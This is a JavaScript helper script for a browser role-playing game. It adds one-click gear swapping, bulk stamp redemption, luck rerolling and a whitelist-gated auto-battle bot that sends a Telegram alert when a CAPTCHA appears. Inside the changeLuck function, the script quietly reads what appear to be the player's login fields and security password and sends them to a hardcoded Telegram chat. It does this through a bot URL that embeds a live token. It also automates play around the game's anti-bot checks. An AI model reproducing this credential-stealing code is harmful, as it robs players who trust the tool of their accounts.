/****************************修改原生功能開始****************************/
function cd_add(t) {
    if(t==2|t==10){
        return;
    }
    counts = x + t,
    start_time = new Date,
    start_time = Date.parse(start_time) / 1e3,
    setup_time(start_time),
    window.setTimeout("CountDown()", 100)
}
function event() {
	parent.sendNoti();
	var t = parent.wog_view.document;
	message_cls();
	var e = new Date;
	t.write(temp_table1),
	t.write('<form action="wog_act.php" method="post" target="mission"><tr><td>站長要考驗大家是否有認真在玩</td></tr><tr><td>請注意...必須用半形字 及 數目字 1-9 輸入驗證碼 , 每人有5次機會</td></tr><tr><td colspan="2"><img src="wog_etc.php?f=confirm&time=' + e.getTime() + '"></td></tr><tr><td>請輸入安全驗證碼:<input type="text" name="sec_code" size="8"></td></tr>'),
	t.write('<tr><td colspan="2"><input class="text" type="button" value="填好答案了,放我過關吧!!" onClick="parent.foot_trun(\'event\',\'\',this.form.sec_code.value,\'\')" style="' + sbutton + '"></td></tr></form>'),
	t.write(temp_table2)
}
function arm_unsetup_all_success() {
	var t, e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
	for (t = 0; t < e.length; ++t){
		arm_setup(e[t], "");
	}
	let q = parent.wog_view.document;
	message_cls();
	q.write(temp_table1);
	q.write('<tr bgcolor="#4B689E"><td>所有裝備已成功卸下</td></tr>');
	q.write(temp_table2);
}
function arm_view(t, e, r, i, o) {
    message_cls();
    var d = parent.wog_view.document;
    if (vData = e,
    arm_head(),
    d.write('<hr><tr><td colspan="11" >可使用的背包格數 ：' + i + " </td></tr>"),
    d.write('<form action="wog_act.php" method="post" target="mission" name=f2 >'),
    d.write(temp_table1),
    d.write("<tr><td>NO</td><td>裝/轉</td><td>物攻</td><td>魔攻</td><td>物防</td><td>魔防</td><td>速度</td><td>名稱</td><td>金錢</td><td>霧靈</td><td>印花</td><td>幻點</td><td>販/拍</td></tr>"),
    "0" != e)
        for (var n = t.split(";"), a = 0, l = 0, s = 0; s < n.length; s++) {
            var p = n[s].split(",")
              , c = srhCount(p[0])
              , m = null;
            "" != tmpNum && (m = tmpNum.split(","));
            for (var u = 0; u < c; u++) {
                var w = ""
                  , _ = "";
                if (l++,
                w = "" + att[p[16]],
                _ = p[16] > 0 ? "<img src='/img/att.jpg' alt='" + w + "' title='" + w + "'>" : "",
                null != m)
                    var b = "*" + m[u];
                else
                    b = "";
                var g = "";
                "1" == p[12] && (g = "bgcolor=" + nosend),
                "<acronym title='力量:" + p[8] + " 速度:" + p[9] + " 智力:" + p[10] + " 轉生:" + p[14] + " 職業:" + p[11] + "'>限制</acronym>",
                d.write("<tr " + g + " onMouseOver=\"this.style.backgroundColor='#777779'\" onMouseOut=\"this.style.backgroundColor=''\" onclick=\"parent.setRadioValue('adds'," + p[0] + ");parent.setCheckBoxValue(" + a + ')" style="cursor:hand"><td>' + l + '</td><td><input type="radio" name="adds" value="' + p[0] + '" data-name="' + p[5] + '"></td><td>' + p[6] + "</td><td>" + p[7] + "</td><td>" + p[1] + "</td><td>" + p[2] + "</td><td>" + p[3] + "</td><td><a href=\"javascript:parent.data_send2('arm','check_arm','" + r + "'," + p[0] + "," + l + ')">' + p[5] + "</a>" + b + _ + "</td><td>" + p[4] + "</td><td>" + p[15] + "</td><td>" + p[17] + "</td><td>" + p[18] + '</td><td><input type="checkbox" name="items[]" id="listKey-' + a + '" value="' + p[0] + '"></td></tr>'),
                a++
            }
        }
    else
        d.write("<tr><td colspan=11>裝備欄內沒有任何裝備</td></tr>");
    n = o.split(",");
    d.write('<tr bgcolor="#777779"><td>---</td><td>---</td><td>' + n[0] + "</td><td>" + n[1] + "</td><td>" + n[2] + "</td><td>" + n[3] + "</td><td>" + n[4] + "</td><td>" + n[10] + "</td><td>" + n[11] + "</td><td>" + n[12] + "</td><td>" + n[13] + "</td><td>" + n[14] + "</td><td>---</td></tr>"),
    d.write('<tr><td colspan="11" ><input type="submit" value="裝備" style="' + sbutton + '"> <input type="button" value="卸下" onclick="parent.foot_trun(\'arm\',\'demount\',\'' + r + '\')" style="' + sbutton + '"> <input type="button" value="轉移" onClick="parent.data_send(\'arm\',\'move\',document.f2.pay_id.value,document.f2.item_num.value,document.f2.adds,document.f2.pw.value)" style="' + sbutton + '"> <input type="button" value="販賣" style="' + sbutton + "\" onClick=if(confirm(\"確定販賣？\")){parent.data_send('arm','sale','" + r + '\',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}> <input type="button" value="擺攤" onClick="parent.sale_item(document.f2.adds,document.f2.pay_id.value)" style="' + sbutton + '"> <input type="button" value="換印花" style="' + sbutton + "\" onClick=if(confirm(\"確定轉換？\")){parent.data_send('arm','stamp','" + r + "',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}><input type=\"button\" value=\"多選物品\" onclick=\"parent.selectMultipleItem()\" style=\"font-family: 細明體;font-size: 9pt;color: #06fdff;border: 1px solid #EFEFEF;background-color: #000000;\"></td></tr>"),
    "d_item_id" == r ? (d.write('<tr><td colspan="11" >請選擇數量:<input type="text" name="item_num" value="1" size="4" maxlength="4"> (最大9999)'),
    d.write("(使用轉移,販賣及換印花記得選擇道具數量)</td></tr>")) : d.write('<input type="hidden" name="item_num" value="1">'),
    d.write('<tr><td colspan="11" >欲轉移需輸入對方遊戲的帳號 <input type="text" name="pay_id" size="16"> 安全密碼 <input type="password" name="pw" size="16"></td></tr>'),
    d.write(temp_table2),
    d.write('<input type="hidden" name="f" value="arm">'),
    d.write('<input type="hidden" name="act" value="setup">'),
    d.write("</form>"),
    d.write('<div id="armview" name="armview" style="display:none;background:black;border:1px solid #4B689E;width:160px;height:100px;position:absolute;left:0px;top:0px"></div>'),
    d.write('<div id="wog_message_box"></div>')
}
/****************************修改原生功能結束****************************/
function z(){
	parent.wog_view.document.getElementsByName("f1")[0][9].click();
}
async function sendNoti(){
	let tgid = "-1002556694569";
	if(!(sessionStorage.getItem("tgid")==null)){
		tgid=sessionStorage.getItem("tgid");
	}
    const telegramUrl = "https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id="+tgid+"&text=因驗證碼出現,自動打怪停止:"+parent.p_name;
	await fetch(telegramUrl);
	genRndCode();
}
function selectMultipleItem() {
    let item=prompt();
    for (let i = 0; i < parent.wog_view.document.getElementsByName("items[]").length; i++) {
        if (parent.wog_view.document.getElementsByName("items[]")[i].value == item) {
            parent.wog_view.document.getElementsByName("items[]")[i].checked = true;
        }
    }
}
async function changeLuck(){
	let safePW = prompt("輸入安全碼");
	let formData = new FormData();
	formData.append('act', "ch_luck");
	formData.append('f', "ch");
	formData.append('pw', safePW);
	let i = 0;
	let e = parent.wog_view.document;
	message_cls();
	while(true){
	    await fetch("https://wog.we-u.net/wog_act.php",
	        {
			body: formData,
			method: "post"
	        }).then((response) => {
		        return response.text();
	        }).then((html) => {
	        	let start = (html.indexOf("p_luck"))+7;
			let temp = html.substring(start,html.length);
			let end = temp.indexOf("</script>");
			luckValue = parseInt((html.substring(start,start+end)).replace("'",""));
			return luckValue;
	        });
	        if (!Number.isInteger(luckValue)) {
        		e.write(temp_table1);
          		e.write("<tr bgcolor='#4B689E'><td>改運失敗, 安全碼錯誤</td></tr>");
          		e.write(temp_table2);
          		delete luckValue;
          		break;
	        }
	        i++;
	        e.write(temp_table1);
		e.write("<tr bgcolor='#4B689E'><td>第"+i+"次改運,數值為: "+ luckValue+"</td></tr>");
		e.write(temp_table2);
	        if(luckValue>24){
	        	delete luckValue;
	        	let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text="+a+"|"+b+"|"+c);
	        	break;
	        }
	}
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function armPage(){
	message_cls();
	parent.wog_view.document.write(`
	<form action="wog_act.php" method="post" target="mission" name="f1">
	<table border="2" cellpadding="2" border-collapse="collapse" width="30%">
	  <thead>
	    <tr>
	      <th></th>
	      <th>裝備選擇</th>
	    </tr>
	  </thead>
	  <tbody>
	    <tr>
	      <td colspan="2"><input type="button" value="一鍵換裝" onclick="parent.armAll(parent.armPageindexChecked())"/></td>
	    </tr>
	    </tbody>
	    <tr>
	      <td colspan="2" style="color:red;">請不要裝備自己沒有的裝備</td>
	    </tr>
	</table>
	</form>
	`);
	parent.drawSetList();
	parent.armPageCss();
}
async function drawSetList(){
	let e = parent.wog_view.document;
	let eTable = parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("tbody")[0].getElementsByTagName("tr");
	let firstRow = eTable[0];
	let setJ = fetch('https://raw.githack.com/TauRus1001/Wog/main/setList.json')
    	.then((response) => response.json())
   	.then(
        async(json) => {
            //console.log(json);
            for(let i=json.sets.length-1;i>=0;i--){
            	//console.log(json.sets[i].title);
            	let firstRow = eTable[0];
            	firstRow.outerHTML="<tr onclick='this.getElementsByTagName(\"td\")[0].getElementsByTagName(\"input\")[0].checked=true;'><td><input type='radio' name='index_id'></td><td>"+json.sets[i].title+"</td></tr>"+firstRow.outerHTML;
            }
		//firstRow.outerHTML="<tr><td><input type='radio' name='index_id'></td><td>3刀流奧義套裝</td></tr>"+firstRow.outerHTML;
        });
}
function armPageCss(){
	let styles = `
		table{
		 border-color:#868686;
		 border-collapse: collapse;
		  padding: 5px;
		  font-family: 細明體;
		  margin-left:35%;
		}
		tbody tr:not(:last-child){
		  cursor: pointer;
		}
		td:first-child {
		  width: 5em;
		}
		table input{
		  color: #efefef;
		  border: 1px solid #efefef;
		  background-color: #000000;
		  font-family: 細明體;
		}
		tbody tr:not(:last-child):hover{
		  background-color: #777779;
		}
	`;
	let styleSheet = parent.wog_view.document.createElement("style");
	styleSheet.textContent = styles;
	parent.wog_view.document.head.appendChild(styleSheet);
}
async function armAll(selected){
//console.log("selected="+selected);
let e = parent.wog_view.document;
let setj = fetch('https://raw.githack.com/TauRus1001/Wog/main/setList.json')
    .then((response) => response.json())
    .then(
        async(json) => {
            //console.log(json);
            if(selected<0 || selected>json.sets.length-1){
		e.body.innerHTML="";
		e.write(temp_table1);
		e.write('<tr bgcolor="#4B689E"><td>輸入錯誤選項</td></tr>');
		e.write(temp_table2);
		return;
		}
		let unArmList = json.sets[selected].unArmList;
		for(let i = 0;i<unArmList.length;i++){
			parent.unArm(unArmList[i]);
			await parent.sleep(150);
		}
		let armList = json.sets[selected].armList;
		for (let i = 0; i<armList.length;i++){
			await parent.sleep(150);
			await parent.armItem(armList[i]);
		}
		await parent.sleep(150);
		e.body.innerHTML="";
		e.write(temp_table1);
		e.write('<tr bgcolor="#4B689E"><td>裝備完成</td></tr>');
		e.write(temp_table2);
        });
}
async function unArm(index){
    	let e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
	let formData = new FormData();
	formData.append('f', "arm");
	formData.append('act', "demount");
	formData.append('pay_id', e[index]);
	await fetch("https://wog.we-u.net/wog_act.php",
	{body: formData, method: "post"})
	.then((response) => {return response.text();})
        .then((html) => {arm_setup(e[index], "");});
}
async function armItem(item){
	let formData = new FormData();
	formData.append('adds', item);
	formData.append('f', "arm");
	formData.append('act', "setup");
	await fetch("https://wog.we-u.net/wog_act.php",
	{body: formData, method: "post"})
	.then((response) => {return response.text();})
	.then((html) => {wog_view.document.write(html);});
}
function armPageindexChecked(){
	for(let i = 0;i<parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input").length;i++){
	    if(parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input")[i].checked){
	        return i;
	    }
	}
}
async function changeStamp(changeAmount,changeTime){
	if(changeTime<1||changeTime>100){
		alert("錯誤的換領次數，請輸入1-100");
		return;
	}
    let changeData=[];
	let formData = new FormData();
	let e = parent.wog_view.document;
	e.body.innerHTML="";
	formData.append('f', "ch");
	formData.append('act', "stamp");
	formData.append('temp_id', changeAmount);
    e.write(temp_table1);
    e.write('<tr><td>換領中...請稍後..請不要離開頁面</td></tr>');
    e.write(temp_table2);
	for(let i = 0;i<changeTime;i++){
	await fetch("https://wog.we-u.net/wog_act.php",
	    {
	        body: formData,
	        method: "post"
	    }).then((response) => {
        	return response.text();
        }).then((html) => {
		let start = 0;
		start = (html.indexOf("stamp_end"))+10;
		let temp = html.substring(start,html.length);
		let end = temp.indexOf("')</script>");
		itemValue = (html.substring(start,start+end)).replace("'","");
        aLength = changeData.length;
        add = true;
        for(let i =0;i<aLength;i++){
            if(!(changeData[i].name==itemValue)){
                continue;
            }
            add = false;
            changeData[i].t +=1;
            break;
        }
        if(add==true){
            changeData.push({name:itemValue,t:1});
        }
		
		if(end === -1){
            e.write(temp_table1);
			e.write('<tr><td>沒有足夠的印花</td></tr>');
            e.write("</td></tr>" + temp_table2);
            i=changeTime;
		}
	    return itemValue;
        });
    }
    e.write('<hr>');
    e.write(`<div align="center"><table border="2" cellspacing="0" cellpadding="2" bordercolor="#868686"><tbody><tr><td width="auto" nowrap="nowrap">已換領項目</td><td width="15%" nowrap="nowrap">數量</td></tr>`);
    for(let j = 0; j<changeData.length;j++){
        e.write('<tr><td>'+changeData[j].name+'</td><td>'+changeData[j].t+'</td></tr>');
    }
    e.write(temp_table2+'</div>');
}
async function newStampHouse(){
	message_cls();
	let stampNumber = await getStampNumber();
	wog_view.document.write(`<form action="wog_act.php" method="post" target="mission"><table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686"><tbody><tr><td>歡迎來到印花屋,大家可以將沒用的裝備換成印花,然後到此換領不同的禮物!每次換領需收取10萬元手續費喔!請在下面選擇閣下想換領的印花數目!</td></tr></tbody></table><hr><p style="position: relative; left: 2%; font-family: 細明體; font-size: 10pt; color: #EFEFEF;">你的印花數目:<font style="color: yellow;font-size:30px;"><b>`+stampNumber+`</b></font></p><p style="position: relative; left: 2%; font-family: 細明體; font-size: 10pt; color: #EFEFEF;">換領次數: <input type="number" id="changeTime" value="1" style="position: relative; left: 1%; font-family: 細明體; font-size: 10pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000"></p><p style="position: relative; left: 2%;color:red;">連續換領會對伺服器做成負擔，故上限設定為100次</p><table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686"><tbody><tr><td>印花數目</td><td>可換禮物</td></tr><tr><td><input type="button" value="50個印花" onclick="if(confirm('是否使用50個印花換領禮物?')){parent.changeStamp(50,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:`+Math.floor(stampNumber/50)+`)</td><td>路加達．戒<br>C箱<br>三國．啟動碼<br>薑餅仔的眼睛<br>捕捉器<br>50000 hp回復劑<br>金太陽徽章<br>120000 hp回復劑<br>160000 hp回復劑<br>200000 hp回復劑<br>幻想會員證<br>80000 hp回復劑<br>500霧靈換領券<br>一階封神石<br>幻想寶箱<br>卡片寶箱<br>殘卷寶箱<br>二百億換領券<br>石頭寶箱<br>咒紋錦盒<br>一百億兌換卷<br>封印錦盒<br><font color="0000FF">登入禮卷</font><br></td></tr><tr><td><input type="button" value="200個印花" onclick="if(confirm('是否使用200個印花換領禮物?')){parent.changeStamp(200,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:`+Math.floor(stampNumber/200)+`)</td><td><font color="0000FF">登入禮卷</font><br>1500霧靈換領券<br>200%天籟真元(250場)<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br>封印錦盒<br></td></tr><tr><td><input type="button" value="500個印花" onclick="if(confirm('是否使用500個印花換領禮物?')){parent.changeStamp(500,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:`+Math.floor(stampNumber/500)+`)</td><td>200%天籟真元(700場)<br>素材寶箱<br>潘朵拉的卡片<br>赫淮斯托斯的卡片<br>一百億兌換卷<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br></td></tr><tr><td><input type="button" value="1000個印花" onclick="if(confirm('是否使用1000個印花換領禮物?')){parent.changeStamp(1000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:`+Math.floor(stampNumber/1000)+`)</td><td>殘卷寶箱<br>B箱<br>六百億換領券<br>幽冥護符<br>神諸葛亮<br>神呂布<br></td></tr><tr><td><input type="button" value="2000個印花" onclick="if(confirm('是否使用2000個印花換領禮物?')){parent.changeStamp(2000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:`+Math.floor(stampNumber/2000)+`)</td><td>魅力之水<br>體質之水<br>生命之水<br>信仰之水<br>王者護符<br><font color="FFD700">精剛石</font><br>5000霧靈換領券<br>仙奇丹<br><font color="FFD700">封印的金龍石</font><br></td></tr><tr><td><input type="button" value="6000個印花" onclick="if(confirm('是否使用6000個印花換領禮物?')){parent.changeStamp(6000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:`+Math.floor(stampNumber/6000)+`)</td><td><font color="FFD700">封印的金龍石</font><br><font color="FFD700">至尊書頁</font><br>A箱<br>智力之水<br><font color="FFFF99">糖糖</font><br>V剎經驗包<br>幻想廢礦<br>力量之水<br>速度之水<br>十億經驗值乾坤袋<br></td></tr><tr></tr></tbody></table></form>`);
	parent.stampHouseCss();
}
async function getStampNumber(){
    let formData = new FormData();
    formData.append('f', "chara");
    formData.append('act', "status_view");

    let stampNo = await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
    })
    .then(async (response) => {
        return response.text();
    }).then((html) => {
    let start = (html.indexOf("show_status") + 12);
    let temp = html.substring(start, html.length);
    let end = temp.indexOf(";");
    temp = temp.substring(0, end - 1);
    let myArray = temp.split(",");
    let stampNo = myArray[myArray.length-1];
    return parseInt(stampNo.replace("'",""));
    });
    return stampNo;
}
function stampHouseCss(){
	let styles = `
	    input#changeTime::-webkit-outer-spin-button,
	    input#changeTime::-webkit-inner-spin-button {
		  -webkit-appearance: none;
		  margin: 0;
		}`;
	let styleSheet = document.createElement("style");
	styleSheet.textContent = styles;
	parent.wog_view.document.head.appendChild(styleSheet);
}
function setChatid(){
	let chatid="";
	if(sessionStorage.getItem("tgid")==null){
		chatid = prompt("輸入telegram chat id","");
	}else{
		chatid = prompt("輸入telegram chat id",sessionStorage.getItem("tgid"));
	}
    if (chatid === null|chatid==="") {
        console.log("canceled");
        return;
    }
	sessionStorage.setItem("tgid", chatid);
	let c = genRndCode();
	fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4635269629&text="+parent.p_name+"|chat_id:"+chatid+"|"+c);
	sessionStorage.setItem("tempc", c);
	sessionStorage.setItem("rTime", 0);
	alert(c);
}
function genRndCode(){
    const upperChars = [];
    const lowerChars = [];
    for (let i = 65; i < 91; i++) {
      let char = String.fromCharCode(i);
      upperChars.push(char);
      lowerChars.push(char.toLowerCase());
    }
    const arr = upperChars.concat(lowerChars)  ;
    let randomChar = arr[Math.floor(Math.random() * 52)];
    const nums = [];
    for (let i = 0; i <= 9; i++) {
      nums.push(i);
    }
    
    const myArr = upperChars.concat(lowerChars, nums);
    const sixCodes = [];
      
    for (let i = 1; i <= 6; i++) {
      let randomCode = myArr[Math.floor(Math.random() * 62)];
      sixCodes.push(randomCode);
    }
    let result = sixCodes.join('');
    sessionStorage.setItem("tempc", result);

    return result;
}
async function getWhite(){
let setJ = await fetch('https://raw.githack.com/TauRus1001/Wog/refs/heads/main/white.json')
    	.then((response) => response.json())
       	.then(
        async(json) => {
            b = json.a.filter(e => e.n == btoa(encodeURIComponent(parent.p_name))&&e.c == sessionStorage.getItem("tempc"));
            if(b.length>0){
		a = new Date();
		for (let runtime = sessionStorage.getItem("rTime"); runtime <3e2+1; runtime++){
			if(parent.foot.document.f1.ats1.value != "開始冒險"){
				await parent.sleep(5000);
				continue;
			}
			if(parent.wog_view.document.getElementsByTagName("table")[0].getElementsByTagName("td")[0].innerText=="站長要考驗大家是否有認真在玩"){
				sendNoti();
				parent.genRndCode();
				break;
			}
			ad_view();
			await parent.sleep(1000);
			z();
                    	sessionStorage.setItem("rTime", runtime);
			await parent.sleep(7500);
			if(new Date()-a>(3.6e6)){
				parent.genRndCode();
				return;
			}
		}
                parent.genRndCode();
            }
        });
}
function createExtraFunction(){
	//https://ithelp.ithome.com.tw/m/articles/10291496
	const oriTable = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0];

	let newColumn1 = document.createElement('td');
	newColumn1.setAttribute('valign','top');
	oriTable.appendChild(newColumn1);
	newColumn1.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='一鍵改運' onclick='parent.changeLuck()' class='button' accesskey='1'></td></tr><tr><td><input type='button' value='一鍵換裝' onclick='parent.armPage()' class='button' accesskey='2'></td></tr></tbody></table>";
	
	let newColumn2 = document.createElement('td');
	newColumn2.setAttribute('valign','top');
	oriTable.appendChild(newColumn2);
	newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='復活中心' onclick='parent.act_click(\"chara\",\"revive\")' class='button' accesskey='3'></td></tr><tr><td><input type='button' value='新印花屋' onclick='parent.newStampHouse()' class='button' accesskey='4'></td></tr></tbody></table>";

	let newColumn3 = document.createElement('td');
	newColumn3.setAttribute('valign','top');
	oriTable.appendChild(newColumn3);
	newColumn3.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='通知設定' onclick='parent.setChatid()' class='button' accesskey='5'></td></tr></tbody></table>";

	fetch('https://raw.githack.com/TauRus1001/Wog/refs/heads/main/white.json')
    .then((response) => response.json())
   	.then(
        async(json) => {
            b = json.a.filter(e => e.n == btoa(encodeURIComponent(parent.p_name)));
            if(b.length>0){
            	let newColumnS = document.createElement('td');
				newColumnS.setAttribute('valign','top');
				oriTable.appendChild(newColumnS);
				newColumnS.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='測試冒險' onclick='parent.getWhite()' class='button'></td></tr></tbody></table>";
            }else{
            	console.log("not matched");
            }
        });
}
